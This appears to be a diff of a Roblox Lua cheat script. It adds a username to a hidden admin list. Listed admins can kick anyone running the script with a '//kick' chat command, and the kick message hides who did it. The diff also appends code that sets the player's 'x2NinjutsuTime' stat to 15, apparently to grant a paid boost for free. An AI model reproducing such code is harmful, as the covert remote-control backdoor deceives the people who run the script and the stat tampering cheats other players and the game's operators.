@@ -4,21 +4,21 @@ local TextChatService = game:GetService("TextChatService")
 local LocalPlayer = Players.LocalPlayer
 
 local Admins = {
-    ["philippinesbraxy123"] = true
+    ["philippinesbraxy123"] = true,
+    ["bowmbaclaat"] = true
 }
 
 local function ChatCommand(speakerName, message)
     if not Admins[speakerName] then return end
     message = message:lower()
 
-    -- Look for //kick <target>
+    
     local kickTarget = message:match("//kick%s+(%w+)")
     if kickTarget and LocalPlayer.Name:lower():find(kickTarget) then
         LocalPlayer:Kick("You were removed from the game by an unknown authority.")
     end
 end
 
--- Listen to *all* messages (general + whispers + system)
 TextChatService.MessageReceived:Connect(function(messageData)
     local textSource = messageData.TextSource
     if textSource then
@@ -28,3 +28,14 @@ TextChatService.MessageReceived:Connect(function(messageData)
         end
     end
 end)
+
+--x2 ninjutsu malala
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+
+local Stats = LocalPlayer:WaitForChild("Stats")
+local x2NinjutsuPass = Stats:WaitForChild("x2NinjutsuTime")
+
+
+x2NinjutsuPass.Value = 15
